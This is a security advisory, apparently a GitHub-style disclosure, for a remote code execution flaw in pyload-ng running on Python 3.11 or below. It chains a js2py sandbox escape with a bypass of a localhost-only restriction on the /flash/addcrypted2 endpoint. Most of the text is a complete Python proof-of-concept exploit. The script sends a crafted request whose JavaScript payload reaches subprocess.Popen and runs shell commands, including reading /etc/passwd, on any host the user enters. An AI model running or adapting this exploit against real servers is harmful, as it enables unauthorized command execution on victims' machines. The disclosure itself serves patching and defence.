summary: "pyload-ng vulnerable to RCE with js2py sandbox escape\n### Summary\nAny pyload-ng\
  \ running under python3.11 or below are vulnerable under RCE. Attacker can send a request\
  \ containing any shell command and the victim server will execute it immediately.\n\n### Details\n\
  js2py has a vulnerability of sandbox escape assigned as [CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape),\
  \ which is used by the `/flash/addcrypted2` API endpoint of pyload-ng. Although this endpoint\
  \ is designed to only accept localhost connection, we can bypass this restriction using HTTP\
  \ Header, thus accessing this API and achieve RCE.\n \n### PoC\n\nThe PoC is provided as `poc.py`\
  \ below, you can modify the shell command it execute:\n\n```python\nimport socket\nimport\
  \ base64\nfrom urllib.parse import quote\n\nhost, port = input(\"host: \"), int(input(\"port:\
  \ \"))\n\npayload = \"\"\"\n// [+] command goes here:\nlet cmd = \"head -n 1 /etc/passwd;\
  \ calc; gnome-calculator;\"\nlet hacked, bymarve, n11\nlet getattr, obj\n\nhacked = Object.getOwnPropertyNames({})\n\
  bymarve = hacked.__getattribute__\nn11 = bymarve(\"__getattribute__\")\nobj = n11(\"__class__\"\
  ).__base__\ngetattr = obj.__getattribute__\n\nfunction findpopen(o) {\n    let result;\n \
  \   for(let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i]\n       \
  \ if(item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") {\n            return\
  \ item\n        }\n        if(item.__name__ != \"type\" && (result = findpopen(item))) {\n\
  \            return result\n        }\n    }\n}\n\nn11 = findpopen(obj)(cmd, -1, null, -1,\
  \ -1, -1, null, null, true).communicate()\nconsole.log(n11)\nfunction f() {\n    return n11\n\
  }\n\n\"\"\"\n\ncrypted_b64 = base64.b64encode(b\"1234\").decode()\n\ndata = f\"package=pkg&crypted={quote(crypted_b64)}&jk={quote(payload)}\"\
  \n\nrequest = f\"\"\"\\\nPOST /flash/addcrypted2 HTTP/1.1\nHost: 127.0.0.1:9666\nContent-Type:\
  \ application/x-www-form-urlencoded\nContent-Length: {len(data)}\n\n{data}\n\"\"\".encode().replace(b\"\
  \\n\", b\"\\r\\n\")\n\ndef main():\n\n    s = socket.socket()\n    s.connect((host, port))\n\
  \n    s.send(request)\n    response = s.recv(1024).decode()\n    print(response)\n\nif __name__\
  \ == \"__main__\":\n    main()\n\n\n```\n\n### Impact\n\nAnyone who runs the latest version\
  \ (<=0.5.0b3.dev85) of  pyload-ng under python3.11 or below. pyload-ng doesn't use js2py for\
  \ python3.12 or above."
